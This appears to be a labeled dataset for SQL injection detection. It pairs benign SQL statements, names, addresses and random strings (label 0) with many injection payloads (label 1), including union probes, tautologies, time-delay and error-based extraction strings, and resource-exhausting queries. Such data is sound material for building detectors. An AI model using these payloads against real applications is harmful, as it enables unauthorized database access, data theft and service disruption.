Query,Label
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""fktl""  =  ""fktl",1
SELECT AVG ( base ) FROM since SELECT SUM ( smallest ) ,0
or 0  =  0 --,1
SELECT TOP 50 PERCENT * FROM balloon,0
43595,0
SELECT account ( s )  FROM torn UNION,0
"-9315'   )    )     )   union all select 5057,5057,5057,5057,5057#",1
select   (  case when   (  4660  =  4660  )   then 4660 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,1
navas de san juan,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual# gnga",1
2l04a8,0
"1%""  )   and 8626  =  3626#",1
5ecom058a?8a,0
SELECT AVG ( during )  FROM buy  SELECT SUM ( brown ) ,0
68318279e,0
SELECT TOP 3 * FROM depend WHERE piano = 'best',0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""%""  =  """,1
"1'   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   'dkra' like 'dkra",1
-5470'   )    )    or   (  8459  =  8459  )  *4906 and    (    (   'oeam'  =  'oeam,1
rodis-ryan@colorprint.info,0
SELECT MIN ( fire )  AS finish FROM longer,0
estorbar,0
"-4340   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   8505  =  8505",1
SELECT * FROM simply ORDER BY desk DESC,0
SELECT COUNT ( whom ) FROM inside,0
"-9861' union all select 5710,5710,5710,5710,5710--",1
"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and    (    (   ""xeki"" like ""xeki",1
"-8215%""  )   union all select 3877,3877,3877,3877,3877,3877--",1
credenciales incorrectas,0
francoeu,0
" SELECT COUNT ( CustomerID ) , Country FROM Customers GROUP BY Country HAVING COUNT ( CustomerID )  > 5  ORDER BY COUNT ( CustomerID )  DESC;",0
4.81172E+15,0
7311,0
"1'  )   where 5317  =  5317 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"  SELECT except,he,extra FROM child LEFT JOIN Orders ON market.classID =  palace.dead ORDER BY course.leader",0
3390,0
SELECT * FROM dark WHERE physical BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT TOP 3 * FROM push SELECT * FROM quick 3SELECT * FROM series,0
ru5runears2,0
8693,0
SELECT * FROM surface WHERE trap = 'iron',0
"c/ fuente del peral 41,",0
48714518n,0
1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
-4363%'   )    )     )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  '%'  =  ',1
SELECT TOP 50 PERCENT * FROM manufacturing,0
SELECT * FROM bad WHERE baby BETWEEN row09/01/1996moving AND mood15/31/1996development,0
SELECT DAYOFYEAR ( CURDATE (   )  )  ;,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and ""xcjt""  =  ""xcjt",1
SELECT TOP 3 * FROM flag WHERE hand = 'powerful',0
78267819s,0
SELECT * FROM molecular WHERE porch NOT LIKE 'local%',0
SELECT * FROM agree WHERE    NOT labor = 'action',0
/,1
" SELECT column_name ( s )  FROM describe,came",0
SELECT * FROM glad WHERE source = 'fairly'  OR widely = 'image',0
"1""  )   where 9648  =  9648 and elt  (  1210  =  1210,sleep  (  5   )    )   --",1
3180,0
" SELECT * FROM mouth ORDER BY wish, north",0
SELECT TOP 50 PERCENT * FROM badly SELECT * FROM thee FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM leave,0
SELECT TOP 3 * FROM finger WHERE eye = 'paragraph',0
" SELECT * FROM student ORDER BY party, golden",0
1'||  (  select 'ghby' from dual where 4854  =  4854,1
"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
"1' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
SELECT * FROM master  WHERE space = graph,0
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  'ohqs' like 'ohqs,1
ech5d7,0
lonnie,0
SELECT * FROM  ( SELECT either FROM parallel ) ,0
6014,0
-3496'   )    )    or 9323  =  9323#,1
SELECT * FROM strip,0
SELECT * FROM speed 3 SELECT * FROM listen,0
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  ",1
"-9136'  )   or make_set  (  9354  =  9354,7185  )  ",1
lopez castrillon 162,0
"  UPDATE hot SET fat =  'wash', City =  'band' WHERE almost =  root",0
"1 union all select null,null,null,null,null,null,null,null--",1
"1   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  8018  =  8018",1
koprulu,0
SELECT * FROM call,0
winifred5,0
"1'||  (  select 'wqmz' where 6400  =  6400 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x   )    )   ||'",1
4.46813E+15,0
 UPDATE silly SET press = 'coach'WHERE manufacturing = 'fourth',0
SELECT * FROM paint WHERE spite NOT BETWEEN 'eye' AND 'giving',0
SELECT * FROM people  WHERE gray NOT LIKE '[obtain]%',0
1'+  (  select gqez where 3704  =  3704,1
" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'",1
44706,0
SELECT * FROM slip WHERE husband = 'free'  OR alive = 'did',0
having 1  =  1--,1
"-1894'  )   union all select 8123,8123,8123,8123,8123,8123,8123,8123,8123#",1
pegler,0
"-2377%'   )    )     )   union all select 7706,7706--",1
SELECT eleven ( s FROM nothing RIGHT JOIN,0
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  -- viti",1
SELECT * FROM machinery 3 SELECT * FROM pocket,0
SELECT * INTO newtable [IN externaldb ] FROM oldtable WHERE condition ;,0
SELECT MIN ( large )  AS hardly FROM century,0
91650654r,0
{s,1
bojanic-gidra-tolan@elcarritodelacompra.ma,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'nimx'  =  'nimx",1
"1 where 8908  =  8908 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
mcconnel,0
"1"" where 5372  =  5372 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
-6310 or 6715  =  3399,1
SELECT TOP 50 PERCENT * FROM raise,0
"1 union all select null,null,null,null,null,null,null,null,null--",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 30696 )  ORDER BY meta_id ASC",0
SELECT * FROM Customers  WHERE NOT Country = 'Germany' AND NOT Country = 'USA';,0
"1""  )   as cysq where 5258  =  5258",1
28413,0
scorziel,0
SELECT * FROM review 3 SELECT * FROM opposite,0
"1' or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and 'ntaw'  =  'ntaw",1
ribamontn al mar,0
SELECT TOP 3 * FROM prove WHERE south = 'early',0
SELECT * FROM raw WHERE term = 'entirely' FETCH FIRST 3 ROWS ONLY,0
"1"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""kojr""  =  ""kojr",1
carstens,0
"1%""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT brave FROM tongue UNION ALL SELECT ought FROM business ORDER BY specific,0
" select * from users where id  =  1 union select 1 $,version  (    )   -- 1",1
UPDATE `wp_options` SET `option_value`  =  '0' WHERE `option_name`  =  'medium_large_size_w',0
ductilidad,0
SELECT * FROM shirt WHERE recognize LIKE '%cover%',0
1' where 6035  =  6035 waitfor delay '0:0:5'--,1
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  ""mkal"" like ""mkal",1
78260205z,0
SELECT * FROM tea  WHERE gulf NOT LIKE '[explanation]%',0
96399738e,0
 having 1  =  1--,1
"1""  )   as ranl where 5553  =  5553",1
SELECT * FROM herself WHERE    NOT gas = 'loud',0
louladak,0
elysee,0
n89m3nd2,0
"1  )   where 1880  =  1880 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT AVG ( distant ) FROM area SELECT SUM ( show ) ,0
SELECT * FROM compare WHERE journey = 'improve'  AND City = 'trick',0
SELECT TOP 3 * FROM consist WHERE lunch = 'period',0
SELECT COUNT ( fliesID ) FROM clock,0
5.10E+15,0
9.45715E+15,0
raphael,0
van_bake,0
9.15202E+15,0
SELECT * FROM necessary WHERE money = 'wash'  AND  ( slow = 'office' OR shadow = 'glass' ) ,0
"1'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""vhmc""  =  ""vhmc",1
 )    )   ;waitfor delay '0:0:__TIME__'--,1
select sleep  (  5  )   and    (    (   '%'  =  ',1
1'  )   where 3588  =  3588,1
SELECT * FROM  ( SELECT someone FROM nor ) ,0
SELECT * FROM shoe WHERE Price NOT BETWEEN 10 AND 20,0
17240,0
1'  )   where 7252  =  7252,1
50757533y,0
1.20613E+15,0
-3748' where 9292  =  9292 or 3337  =  2859#,1
pike@multasdetransito.gf,0
"1"" and 4288  =  3696 and ""qqam"" like ""qqam",1
"-6996%"" or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
rohtert,0
"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'yvzf'  =  'yvzf",1
SELECT number FROM may,0
enang.ostar,0
lab2a8o4i0,0
SELECT * FROM also WHERE pleasant  BETWEEN 10 AND 20,0
1%'   )    )    and 4595  =  4595#,1
"1   )    )     )   or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (     (  9474  =  9474",1
"1' and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
dinelli@alcantarapartners.mt,0
FROM  ( SELECT DISTINCT rhyme FROM cake ) ,0
"-6307' where 8916  =  8916 union all select 8916,8916,8916,8916,8916,8916,8916--",1
"1 where 6100  =  6100 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1  )   as tbve where 4828  =  4828,1
viana de jadraque,0
1'  )   as bzem where 4240  =  4240,1
forsyne@velaconsultores.mx,0
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  7338  =  7338",1
 UPDATE block SET village = 'pleasure'WHERE knowledge = 'during',0
"-4515""  )   or elt  (  4545  =  2509,2509  )   and   (  ""lglx""  =  ""lglx",1
97649797p,0
SELECT * FROM mixture WHERE guard BETWEEN '1996-07-01' AND '1996-07-31',0
1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',1
SELECT * FROM mine ORDER BY so,0
1'  )   where 8575  =  8575 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
DELETE FROM silence,0
DELETE FROM construction,0
antih sacido,0
declare @q nvarchar   (  4000  )   select @q   = ,1
"  SELECT Orders.dayrID, Employees.support, Employees.away FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.instanceID ORDER BY Orders.decideID",0
"1'  )   as wnys where 6457  =  6457 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT * FROM join WHERE bad = 'rain'  OR silent = 'possible',0
rabanal morante,0
"1 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  # zcyc",1
hymen_israeli@aulahost.vc,0
"1'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT * FROM die WHERE ball = 'edge',0
SELECT * FROM hearing WHERE Price NOT BETWEEN 10 AND 20,0
"1 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  -- yekf",1
"  SELECT dropID AS ID, four AS importance FROM low",0
zein,0
"  SELECT add,putting,frame FROM clean LEFT JOIN Orders ON recently.courseID =  cage.thirty ORDER BY planet.though",0
"1"" where 7249  =  7249 union all select null,null,null,null,null,null,null,null,null,null--",1
1   )    )    as pzoo where 8036  =  8036 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
ince2@flexinspect.cat,0
SELECT * FROM night 3,0
-9005 union all select 4410#,1
1'+  (  select 'kcix' where 1117  =  1117,1
SELECT * FROM near WHERE carefully = 'way' LIMIT 3,0
"1"" and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and ""fqeu"" like ""fqeu",1
DELETE FROM deeply,0
SELECT MIN ( held )  AS gentle FROM fifty,0
azuqueca de henares,0
dipterocrea,0
"calle juan de uceda, 180,",0
SELECT * FROM year WHERE NOT tightly = 'examine'  AND NOT chose = 'poor',0
"1'+  (  select 'jhce' where 1117  =  1117 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   +'",1
"1%""   )    )     )   order by 1--",1
"  SELECT sister,tide,bright FROM wide LEFT JOIN Orders ON turn.fuelID =  stage.yourself ORDER BY cowboy.yesterday",0
1   )    )    as zykv where 2158  =  2158,1
1'   )    )    as yyud where 4934  =  4934,1
"1""   )    )    or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (   ""ejpw""  =  ""ejpw",1
; exec   (  'sel' + 'ect us' + 'er'  ) ,1
SELECT COUNT ( second )  FROM inside,0
danis,0
SELECT * FROM anyway WHERE doctor = 'strike' FETCH FIRST 3 ROWS ONLY,0
raian,0
"   SELECT Employees.smaller, COUNT ( Orders.noneID )  AS everybodyFROM    ( OrdersINNER JOIN house ON Orders.degreeID  =  Employees.warnID ) ",0
SELECT DATE ( OrderDate )  FROM Orders;,0
asia,0
SELECT * FROM wp_houzez_crm_viewed_listings WHERE listing_id  =  27990 AND user_id  =  0,0
SELECT * FROM room WHERE tide = 'mighty'  OR plenty = 'of',0
"-5691' union all select 6610,6610#",1
SELECT * FROM cap WHERE shape BETWEEN lie09/01/1996blanket AND farmer15/31/1996position,0
"-7580'   )    )    as mmqt where 3468  =  3468 union all select 3468,3468,3468,3468,3468,3468#",1
"1'  )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and   (  'ppwh'  =  'ppwh",1
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
1%' or sleep  (  5  )  #,1
5emic0e,0
calle regimineto del sol 48 10e,0
SELECT * FROM account WHERE horn BETWEEN exciting09/01/1996frighten AND agree15/31/1996scientist,0
terrassa,0
25617,0
"1'||  (  select 'eils' where 8308  =  8308 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
SELECT TOP 3 * FROM lake WHERE correct = 'him' SELECT * FROM tube,0
SELECT * FROM character,0
"  SELECT * FROM suppose WHERE threw IN  ( 'student', 'rope', 'means' )  ",0
"1  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1
"   SELECT shut, brought, flyFROM gravity WHERE floating  IS NOT NULL",0
SELECT from ( s )  FROM duty,0
"calle valle de salazar, 48,",0
"c/ cartagena, 84 3?b",0
59di51ca1,0
84q42o,0
"cruz nueva, s/n 5-c",0
"1  )   where 2720  =  2720 and elt  (  4249  =  4249,7259  )  --",1
"-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT TOP 50 PERCENT * FROM angry,0
2637,0
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,0
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1
55119519l,0
-7242' or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and 'kfff'  =  'kfff,1
badosa estruch,0
"-8707'  )   union all select 5609,5609,5609--",1
SELECT edge,0
"1'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   'mttj' like 'mttj",1
1776,0
"  SELECT splitID AS ID, shorter AS he FROM list",0
" select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )  #",1
"torremacana, 107 7e",0
sims2@videocasa-ebs.ru,0
SELECT satisfied ( s )  FROM library SELECT get FROM fence,0
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",1
18708,0
1632,0
DELETE FROM cookies WHERE parallel = 'correctly',0
SELECT COUNT ( success )  FROM till,0
"plza. musico diaz cano 5,",0
"1""   )    )    or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""qgle"" like ""qgle",1
garner3,0
SELECT * FROM crew ORDER BY group DESC,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'vwxg'  =  'vwxg",1
"  SELECT plannedID AS ID, castle AS lying FROM repeat",0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",1
"SELECT wp_posts.ID FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id AND wp_postmeta.meta_key  =  'fave_agent_visible'  )  LEFT JOIN wp_postmeta AS mt1 ON  (  wp_posts.ID  =  mt1.post_id  )  WHERE 1 = 1 AND  (  wp_postmeta.post_id IS NULL OR  (  mt1.meta_key  =  'fave_agent_visible' AND CAST ( mt1.meta_value AS SIGNED )  ! =  '1'  )   )  AND wp_posts.post_type  =  'houzez_agent' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date ASC LIMIT 0, 2",0
SELECT COUNT ( warnID ) FROM third,0
rohit,0
38623329g,0
SELECT * FROM cut,0
"1%'   )    )    or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (   '%'  =  '",1
SELECT sail ( s )  FROM mouse UNION ALL,0
dirck,0
bowen-gugolka@soyriojano.name,0
" select * from users where id  =  1 or ""%;"" or 1  =  1 -- 1",1
SELECT * FROM ProductsWHERE Price NOT BETWEEN 10 AND 20;,0
5r32n7,0
" SELECT * FROM quarter ORDER BY sold ASC, flew DESC",0
5316,0
chuchazo,0
"1%"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""%""  =  """,1
calle capitan palacios 71,0
SELECT * FROM smooth WHERE entirely BETWEEN wherever09/01/1996damage AND mother15/31/1996remove,0
SELECT * FROM herd WHERE    NOT reach = 'inch',0
"  SELECT giant,having FROM suit WHERE medicine = 'read' UNION SELECT explanation, biggest FROM time",0
5.12155E+14,0
finak,0
1  )   as bpap where 7758  =  7758 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT safe,0
"1 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  # couj",1
9.12244E+15,0
"  SELECT POSITION ( ""3"" IN ""W3Schools.com"" )  AS MatchPosition;",0
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1
46793939w,0
end and    (    (   2160  =  2160,1
#NAME?,0
3226,0
SELECT TOP 3 * FROM shot WHERE dry = 'welcome',0
stefana1,0
 (  select   (  case when   (  3950  =  2747  )   then 1 else 1/  (  select 0  )   end   )    ) ,1
66564863b,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",1
1'||  (  select 'tjzy' where 3037  =  3037,1
esser,0
SELECT * FROM standard FETCH FIRST 50 PERCENT ROWS ONLY,0
aldebar,0
SELECT MIN ( whom )  AS new FROM plastic,0
en546al,0
8.67859E+15,0
SELECT * FROM here WHERE cap NOT LIKE '[sentence]%',0
"1""   )    )    or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""vypw"" like ""vypw",1
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  # lwfs,1
-5021'+  (  select yadq where 4285  =  4285 order by 1#,1
"SELECT wp_posts.ID FROM wp_posts WHERE 1 = 1 AND wp_posts.post_type  =  'acf-field' AND   (  (  wp_posts.post_status  =  'publish'  )  )   AND wp_posts.post_name  =  'field_5f6c887f6771a' ORDER BY wp_posts.menu_order ASC, wp_posts.post_title ASC LIMIT 0, 1",0
476en9o9na5,0
SELECT * FROM breeze WHERE night = 'box' FETCH FIRST 3 ROWS ONLY,0
SELECT TOP 50 PERCENT * FROM measure SELECT * FROM except FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM push,0
1' in boolean mode  )   union all select null--,1
" select * from users where id  =  1 or ""@?"" or 1  =  1 -- 1",1
1'+  (  select 'ohdf' where 7878  =  7878 and 5678  =  3277--,1
